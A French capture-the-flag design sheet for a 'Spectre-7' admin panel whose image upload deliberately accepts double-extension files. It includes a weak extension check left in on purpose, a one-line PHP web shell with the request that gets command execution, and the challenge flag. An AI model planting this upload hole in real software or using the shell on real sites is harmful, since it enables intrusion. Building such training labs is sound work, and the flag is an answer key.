#  CTF – Spectre 7  

***

## Informations générales

| Champ              | Valeur à remplir |
|--------------------|------------------|
| **Nom du challenge** | Spectre-7 Admin Panel |
| **Auteur**           | lenzzair |
| **Difficulté**       | Medium |
| **Code challenge**   | WEB2_E2|

***

## Description du challenge
Panneau admin de spectre 7 avec différent dashboard dont un où on peut upload des images de reseingement sur les opérations de S7
auquelle on peut y upload un fichier double extentions `.php.jpg` par exemple pour y injecté du php. 

***

## Techniques utilisées
-  **Vuln principale** : Upload PHP avec filtrage simple `$imageFileType == ...`  
-  **Double extension** : `shell.php.jpg` uploadé 
-  **Services** : Apache + PHP (mod_php), port 80  
-  **Fichiers clés** : `renseignement.html` (upload form), `uploads/` (dossier cible), `/root-web/flag.txt`  

***

## Création du challenge
1. Interface plutôt lourde (status.html, renseignement.html, attack.html).  
2. Form upload avec `if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg" && $imageFileType != "gif" ) {
    $message .= "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";` check (faible protection).  
3. Pas de MIME check, pas de blacklist → upload `shell.php` direct.  

***

## Problèmes rencontrés
-  **Apache ignore PHP dans double-ext** : `.php.jpg` traité comme image (fix: `.htaccess AddType`).  
-  **Null byte %00** : Modern PHP tronque mal, ne passe pas.  

***

## Structure du projet

```
./
├── admin.html          # page principale
├── status.html         # Dashboard faux Centreon/Kuma
├── renseignement.php  # UPLOAD VULN 
├── attack.html         # Faux terminal
├── controle.html       # page de controle
├── uploads/            # Dossier cible (777) + .htaccess

```

***

## Déploiement interne
```bash

docker build -t image_upload .

docker run --rm -d --name php_upload -p 8080:80 image_upload:latest

```

**Vérif** : `http://localhost:8080/admin.html`

***

## Flag
flag : `S7{sp3ctr37_upl04d_pwn3d}`  
Emplacement : `/root-web/flag.txt`

***

## Writeup interne (réservé à l’orga)
**Chemin attendu** :  
1. Accès panel admin → control.html + renseignement.php
2. Upload `shell.php.jpg` :  
   ```
   <?php system($_GET['command']); ?>
   ```  
3. Appel : `http://target/uploads/shell.php.jpg?command=ls` → RCE.  
4. `command=cat /root-web/flag.txt` → Flag.  


https://github.com/user-attachments/assets/c802e91e-b7f4-40c6-9ed6-5cd119503e34


---
